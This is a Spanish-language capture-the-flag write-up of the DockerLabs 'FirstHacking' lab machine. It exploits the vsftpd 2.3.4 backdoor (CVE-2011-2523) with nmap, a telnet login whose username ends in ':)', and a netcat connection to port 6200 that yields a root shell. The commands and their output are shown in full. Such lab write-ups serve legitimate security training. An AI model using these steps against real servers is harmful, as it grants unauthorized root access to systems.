---
tags:
  - CTF
  - writeup
  - dockerlabs
  - linux
  - ftp
dificultad: "⭐ Muy fácil"
sistema: "Unix"
ip: "172.17.0.2"
técnicas:
  - Enumeración de servicios
  - Explotación de CVE conocido
  - VSFTPD 2.3.4 Backdoor
cve: "CVE-2011-2523"
fecha: "2026-06-12"
estado: "✅ Completada"
---

# 🖥️ Máquina: FirstHacking

**Plataforma:** DockerLabs  
**Dificultad:** Muy fácil  
**SO:** Unix  
**IP objetivo:** 172.17.0.2  
**CVE:** [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)  
**Técnicas:** Enumeración de versiones · Explotación de backdoor en VSFTPD 2.3.4

---

## 🗺️ Flujo del ataque

```
Ping → Nmap (FTP vsftpd 2.3.4) → CVE-2011-2523 → Backdoor puerto 6200 → ROOT
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.063 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.057 ms
2 packets transmitted, 2 received, 0% packet loss
```

**TTL = 64 → Sistema Linux/Unix confirmado**

---

### Escaneo de puertos con Nmap

```bash
sudo nmap -p- -sS -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

**Resultado:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 21/tcp | open   | FTP      | **vsftpd 2.3.4** |

La versión **vsftpd 2.3.4** tiene una backdoor conocida catalogada como **CVE-2011-2523**. Cualquier usuario que se autentique con `:)` al final del nombre activa una shell en el puerto 6200.

---

## 2️⃣ Investigación — CVE-2011-2523

Buscando `ftp vsftpd 2.3.4 exploit github` encontramos que esta versión fue comprometida en su cadena de distribución oficial en 2011.

**Mecanismo del backdoor:**  
Cuando el campo `USER` contiene una cadena terminada en `:)` (carita feliz), el servidor abre una **command shell como root** en el puerto **6200**, accesible sin autenticación adicional.

---

## 3️⃣ Explotación — Método manual (Telnet + Netcat)

Esta es la forma de entender el exploit a bajo nivel, sin usar scripts ni Metasploit.

### Paso 1 — Activar el backdoor vía Telnet

```bash
telnet 172.17.0.2 21
```

```
Trying 172.17.0.2...
Connected to 172.17.0.2.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER hi:)
331 Please specify the password.
PASS hi
```

El usuario puede ser cualquier cadena, lo importante es que termine en `:)`. La contraseña también puede ser cualquier cosa.

---

### Paso 2 — Verificar que el puerto 6200 está abierto

En otra terminal, inmediatamente después del login:

```bash
nmap -p 6200 172.17.0.2
```

```
PORT     STATE SERVICE
6200/tcp open  lm-x
```

✅ El puerto **6200** está abierto → el backdoor fue activado correctamente.

---

### Paso 3 — Conectarse a la shell con Netcat

Repetir el paso 1 (activar el backdoor) y en otra terminal ejecutar **de inmediato**:

```bash
nc 172.17.0.2 6200
```

La shell no muestra prompt, pero está activa. Verificamos:

```bash
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

✅ Shell **root** obtenida en el puerto 6200. Sin escalada de privilegios necesaria.

---

## 4️⃣ Alternativa — Explotación con script

El mismo ataque puede realizarse de forma automatizada usando scripts de Python disponibles en GitHub, o escribiendo uno propio que encadene los pasos anteriores:
- Conexión FTP
- Envío de USER con `:)`
- Conexión al puerto 6200
- Ejecución de comandos

Buscar en GitHub: `vsftpd 2.3.4 exploit python` para encontrar implementaciones listas para usar.

---

## ✅ Resumen

| Campo | Valor |
|-------|-------|
| Servicio | FTP — vsftpd 2.3.4 |
| CVE | CVE-2011-2523 |
| Vector | Backdoor en campo USER (`:)`) |
| Puerto shell | 6200/tcp |
| Acceso | root directo, sin escalada |
| Herramientas | telnet · nmap · netcat |

---

## 📚 Referencias

- [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [GitHub — CVE-2011-2523 exploits](https://github.com/topics/cve-2011-2523)
- [VSFTPD Backdoor análisis técnico](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
